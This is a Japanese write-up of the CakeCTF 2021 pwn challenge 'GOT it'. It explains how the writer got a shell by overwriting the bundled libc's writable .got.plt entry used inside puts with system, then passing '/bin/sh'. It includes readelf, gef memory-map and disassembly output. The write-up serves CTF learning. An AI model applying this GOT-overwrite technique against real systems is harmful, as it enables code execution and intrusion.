# GOT it
https://github.com/kam1tsur3/2021_CTF/blob/master/cakectf/pwn/got_it/chall  
## 概要  
main関数のアドレスとlibc上のprintfのアドレスを与えられた上で、一度だけ任意のアドレスを書き換える処理を行える。  
最後に任意の文字列をputsで表示できる。  
## 解法
問題名からしてGOT Overwriteをするように思えるが、問題のバイナリはFull RELROである。  
しかし付属のlibcはPartical RELROなので、libcのGOT Overwriteができる。  
マジかよ、と思ってreadelfでセクションを見てみたが、ちゃんと.got.pltセクションがあった。  
```
$ readelf -S ./libc.so.6 | grep .got.plt
  [30] .got.plt          PROGBITS         00000000001eb000  001ea000
```  
マジかよ。  
念の為gefのvmmapで確認してみると、確かに書き込み可能な領域だった。  
```
gef> vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Size               Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000001000 0x0000000000000000 r-- /home/t3mp/CTF/cake_ctf/got_it/chall
( snipped )
0x00007ffff7fbd000 0x00007ffff7fc0000 0x0000000000003000 0x00000000001e7000 r-- /home/t3mp/CTF/cake_ctf/got_it/libc.so.6
0x00007ffff7fc0000 0x00007ffff7fc3000 0x0000000000003000 0x00000000001ea000 rw- /home/t3mp/CTF/cake_ctf/got_it/libc.so.6
0x00007ffff7fc3000 0x00007ffff7fc9000 0x0000000000006000 0x0000000000000000 rw-
0x00007ffff7fc9000 0x00007ffff7fcd000 0x0000000000004000 0x0000000000000000 r-- [vvar]
0x00007ffff7fcd000 0x00007ffff7fcf000 0x0000000000002000 0x0000000000000000 r-x [vdso]
( snipped )
gef> telescope 0x00007ffff7fc0000
0x00007ffff7fc0000|+0x0000(000): 0x00000000001eab80
0x00007ffff7fc0008|+0x0008(001): 0x00007ffff7fc7000  ->  0x00007ffff7dd5000  ->  0x03010102464c457f
0x00007ffff7fc0010|+0x0010(002): 0x00007ffff7fe7bb0  ->  0xe3894853fa1e0ff3
0x00007ffff7fc0018|+0x0018(003): 0x00007ffff7f63600  ->  0x48f88948fa1e0ff3
0x00007ffff7fc0020|+0x0020(004): 0x00007ffff7f60800  ->  0x0ff68548fa1e0ff3
0x00007ffff7fc0028|+0x0028(005): 0x00007ffff7f64bb0  ->  0xf9c5f989fa1e0ff3
0x00007ffff7fc0030|+0x0030(006): 0x00007ffff7dfa040  ->  0x00000068fa1e0ff3
0x00007ffff7fc0038|+0x0038(007): 0x00007ffff7f5e6c4  ->  0xf7018b48fa1e0ff3
0x00007ffff7fc0040|+0x0040(008): 0x00007ffff7f602a0  ->  0xf9c5f989fa1e0ff3
0x00007ffff7fc0048|+0x0048(009): 0x00007ffff7f63c00  ->  0x02e2c148fa1e0ff3
```  
以上からlibcのGOT Overwriteが可能なので、printfのアドレスからlibc baseを算出して書きかえる事を考える。  
関数の最後に任意の文字列でputsができるのでputsを書き換えたくなるが、putsは問題バイナリの.gotセクションから呼ばれているのでputsは書き換えれない。  
しかしputsの処理を読んでみると、  
```
gef> disas puts
Dump of assembler code for function puts:
   0x00007ffff7e5c5a0 <+0>:     endbr64
   0x00007ffff7e5c5a4 <+4>:     push   r14
   0x00007ffff7e5c5a6 <+6>:     push   r13
   0x00007ffff7e5c5a8 <+8>:     push   r12
   0x00007ffff7e5c5aa <+10>:    mov    r12,rdi
   0x00007ffff7e5c5ad <+13>:    push   rbp
   0x00007ffff7e5c5ae <+14>:    push   rbx
   0x00007ffff7e5c5af <+15>:    call   0x7ffff7dfa460 <*ABS*+0xa27b0@plt>
   0x00007ffff7e5c5b4 <+20>:    mov    r13,QWORD PTR [rip+0x16398d]        # 0x7ffff7fbff48
   0x00007ffff7e5c5bb <+27>:    mov    rbx,rax
```  
puts+15のcall命令で呼ばれる関数がlibcの.got.pltから呼ばれているので、これをlibc上のsystemに書き換える。  
あとはputsの内容を/bin/shにするだけでシェルが取れた。  